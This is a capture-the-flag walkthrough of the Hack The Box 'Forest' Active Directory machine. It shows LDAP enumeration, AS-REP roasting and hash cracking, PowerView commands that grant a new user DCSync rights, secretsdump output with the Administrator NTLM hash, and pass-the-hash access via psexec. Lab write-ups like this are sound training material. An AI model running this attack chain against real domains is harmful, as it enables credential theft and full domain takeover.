# Forest

Tags: AD-Win
Level: Easy
Tools: nmap, dig, ldapsearch, smbclient, enum4linux, windapsearch.py, GetNPUsers.py, hashcat, evil-winrm, sharphound, bloodhound, PowerView.ps1, secretsdumps.py, psexec.py 
Bugs: AD, local user is service level has permission to create user and dump the NTLM hashes of administrator.
Status: Done
Date: December 13, 2023

### Nmap

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled.png)

I found one domain **htb.local** added into the the /etc/hosts file, trying access the from browser it’s redirecting to https not able reach page 

ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

nmap -sC -sV -p$ports 10.10.10.161

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%201.png)

### Enumeration

Tried **DIG** because port is open but no use

dig @10.10.10.161 htb.local

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%202.png)

It’s worth of checking if the **LDAP server** allows anonymous binds using the ldapsearchtool

 

```bash
ldapsearch -H ldap://10.10.10.161 -x -s base namingcontests
ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local"
ldapsearch -H ldap://10.10.10.161 -x -b dc=htb,dc=local
ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local" "(objectClass=person)"
ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local" "(objectClass=person)" | grep "sAMAccountName"
cat sAMAccountName | cut -d ":" -f 2 > users
cat users
```

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%203.png)

**enum4linux** 10.10.10.161

users in the **enum4linux**

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%204.png)

**SMBCLIENT**

With anonymous login of the **smbclient** not found any information

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%205.png)

**Windasearch**

You can able find username in active directory using this script

#error invalid mode error to run the python script

```bash
https://github.com/ropnop/windapsearch
#error invalid mode error to run the python script
sudo apt-get install libldap2-dev libsasl2-dev
python -m pip install python-ldap or
python -m pip install python3-ldap
#first sceenshot
python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
#second sceenshot
python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"
```

It has identified 28 users

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%206.png)

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%207.png)

**GetNPUsers**

For the user accounts that are enabled with no pre-authentication, (basically Kerberos pre-authentication is disabled) it’s vulnerable to AS-REP Roasting attack. We can request for the user’s Kerberos TGT ticket without providing any authentication, and the TGT ticket which we will get back will be encrypted with account’s password. SO we can crack the hash offline. Using the Impacket’s [GetNPUsers.py](http://GetNPUsers.py) script, we can do attacak:

```bash
./GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
```

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%208.png)

**Hashcat**

Find the **hashcat hash types**(search like this in google) ****then find **hashmode** this case i got 18200

command is 

```bash
hashcat -m 18200 hash_tgt rockyou.txt
john --wordlist=rockyou.txt hash_tgt
```

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%209.png)

It can cracked using john as well

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2010.png)

Now we have username/password are **svc-alfresco/s3rvice** using this login using **crackmapexec** or **evil-winrm** to gain initial foothold

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2011.png)

Crackmapexec is not given any shell let’s try another one.

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2012.png)

### User flag

FInal got initial shell

ls = dir

cat is type for open the flag in windows

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2013.png)

Checking the current user privileages

using this command

**net user /domain**

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2014.png)

Let’s enumerate for current user

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2015.png)

Now this user is part of the **Domain Users** and **Service Accounts**

Transfer the winPEAS.bat file to target then execute see what the vulnerabilities

NO interesting  are found

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2016.png)

Download bloodhound from github https://github.com/BloodHoundAD/BloodHound

Their you can find the SharpHound.exe upload into the target using python server

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2017.png)

```bash
.\SharpHound.exe --collectionmethods All
```

After running the command it’s created 2 new files

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2018.png)

Download these files to local system

first need to start neo4j console credentials neo4j/kali

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2019.png)

The start the bloodhound —nosandbox it will pop new window use the credentials as neo4j/kali

then drag and drop the zip file you downloaded after sharphound.exe file

you will get like this video link [https://youtu.be/H9FcE_FMZio](https://youtu.be/H9FcE_FMZio)

good artical to review 

[HackTheBox-Forest](https://arz101.medium.com/hackthebox-forest-441c2cd7f53)

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2020.png)

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2021.png)

In that **WriteDacl** option click on the help see the below options

> After checking reachable high value targets we discover our service account is a member of the Account Operators group which has Generic All permissions to the Exchange Windows Permissions Group.
> 
> 
> The Exchange Windows Permissions Group has Write Dacl to the domain. This means we can create a user and give it Exchange Windows Permissions rights and give it DCSync ACL privileges with PowerView.
> 

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2022.png)

Creatin the new user and giving required permissions

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2023.png)

using htb document

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2024.png)

```bash
Ps> $SecPassword = ConvertTo-SecureString 'ashok123@' -AsPlainText -Force
Ps> $Cred = New-Object System.Management.Automation.PSCredential('htb\ashok', $SecPassword)
Ps> Add-DomainObjectAcl -Credentials $Cred –TargetIdentity htb.local -PrincipalIdentity ashok -Rights DCSync # not worked hacking articals 
Ps> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ashok -Rights DCSync# not worked hacking articals

Add-ObjectACL -PrincipalIdentity ashok -Credential $cred -Rights DCSync #working from htb document walkthrough
```

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2025.png)

[secrectsdump.py](http://secrectsdump.py) htb/ashok@10.10.10.161

Next day

after entering the password as **ashok123@** it dumped all the NTLM hashes

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2026.png)

### Root flag

We got that Administrator’s NTLM hash

*htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::*

Using we can run [pxexec.py](http://pxexec.py) copy file local directory **/usr/share/doc/python3-impacket/examples/psexec.py** assign the permission of chmod 755 

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2027.png)

Got root flag at Administrator’s desktop folder

![Untitled](Forest%200af32c4b7da143ebb4ac512fbb26533f/Untitled%2028.png)